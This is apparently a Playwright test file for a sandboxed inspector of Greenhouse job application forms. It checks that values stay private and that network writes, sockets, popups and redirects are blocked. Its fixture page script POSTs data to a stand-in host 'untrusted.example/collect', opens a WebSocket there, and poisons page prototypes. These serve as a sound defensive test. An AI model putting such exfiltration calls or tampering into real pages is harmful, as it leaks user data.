import assert from "node:assert/strict";
import { chromium } from "playwright";
import { describeRenderedForm, inspectGreenhouseRendered } from "../src/employer-rendered-browser.ts";
import { inspectGreenhouse } from "../src/employer-greenhouse.ts";

const destination = "https://job-boards.greenhouse.io/fictional/jobs/123";
const asset = "https://job-boards.cdn.greenhouse.io/assets/root-Abcd_123.js";
const result = await inspectGreenhouse(destination, async () => Response.json({ id: 123, internal_job_id: 1, absolute_url: destination, title: "Fictional writer", company_name: "Fictional", location: { name: "Unknown" }, content: "Fictional only", updated_at: new Date().toISOString(), questions: [{ label: "First Name", required: true, fields: [{ name: "first_name", type: "input_text", values: [] }] }], data_compliance: [] }));
assert.ok(result.inspection);
const html = `<h1>Fictional writer</h1><form method="post"><label for="first_name">First Name*</label><input id="first_name" name="first_name" required value="PRIVATE_SENTINEL"><textarea>PRIVATE_TEXTAREA</textarea><div contenteditable="true">PRIVATE_EDITABLE</div><button type="submit">Submit application</button></form><p>By submitting I certify my answers.</p><script src="${asset}"></script>`;
const script = `document.querySelector('textarea').remove(); document.querySelector('[contenteditable]').remove();
document.querySelector('#first_name').value='SCRIPT_PRIVATE';
window.fetch('https://untrusted.example/collect', {method:'POST',body:'FICTIONAL_ONLY'}).catch(()=>{});
window.fetch('/unexpected-get').catch(()=>{});
try { new WebSocket('wss://untrusted.example/socket'); } catch {}
window.open('https://untrusted.example/popup');
Array.from = () => { throw Error('Poisoned page global'); };
Element.prototype.querySelectorAll = () => { throw Error('Poisoned page prototype'); };`;
const browser = await chromium.launch({ headless: true });
try {
  let contacted = [];
  const context = await browser.newContext({ serviceWorkers: "block", viewport: { width: 1280, height: 900 } });
  await context.route("**/*", async route => {
    contacted.push(route.request().url());
    if (route.request().url() === destination) await route.fulfill({ contentType: "text/html", body: html });
    else if (route.request().url() === asset) await route.fulfill({ contentType: "text/javascript", body: script });
    else throw Error("Unexpected request escaped inspection policy");
  });
  const report = await inspectGreenhouseRendered(context, result.inspection);
  assert.equal(report.form.controls.length, 1);
  assert.equal(report.form.controls[0].id, "first_name");
  assert.equal(report.questions_match_metadata, true);
  assert.equal(report.observation.blocked_writes, 1);
  assert.ok(report.observation.blocked_active_resources >= 1);
  assert.equal(report.observation.blocked_websockets, 1);
  assert.equal(report.observation.popup_attempts, 1);
  assert.deepEqual([...new Set(contacted)].sort(), [destination, asset].sort());
  assert.equal(JSON.stringify(report).includes("PRIVATE"), false);
  assert.ok(report.interventions.some(item => item.code === "legal_notice"));
  assert.equal(report.execution_enabled, false);
  await context.close();

  // Direct extraction proves values in all supported editable elements are excluded.
  const clean = await browser.newContext();
  await clean.route("**/*", route => route.fulfill({ contentType: "text/html", body: html.replace(/<script[^>]*><\/script>/, "") }));
  const page = await clean.newPage(); await page.goto(destination);
  const first = await describeRenderedForm(page, destination);
  assert.equal(JSON.stringify(first).includes("PRIVATE"), false);
  await page.locator('#first_name').fill('DIFFERENT_SECRET');
  await page.locator('textarea').fill('DIFFERENT_TEXTAREA');
  const second = await describeRenderedForm(page, destination);
  assert.deepEqual(second, first, "Value-only edits must not change the structure or public-text digest");
  await clean.close();
  for (const scenario of ["redirect", "multiple-forms", "wrong-content-type"]) {
    const rejected = await browser.newContext({ serviceWorkers: "block" });
    const reached = [];
    await rejected.route("**/*", async route => {
      reached.push(route.request().url());
      if (scenario === "redirect") await route.fulfill({ status: 302, headers: { location: "https://untrusted.example/redirect" } });
      else await route.fulfill({ contentType: scenario === "wrong-content-type" ? "application/json" : "text/html", body: "<form></form><form></form>" });
    });
    await assert.rejects(inspectGreenhouseRendered(rejected, result.inspection), undefined, scenario);
    assert.deepEqual(reached, [destination], "Redirect target must never reach the network");
    await rejected.close();
  }
  console.log("Passed: isolated-world extraction resists page monkeypatching; writes/unknown GETs/sockets/popups denied; no values collected; legal notice detected; value-only changes excluded from fingerprints. No real employer requests.");
} finally { await browser.close(); }
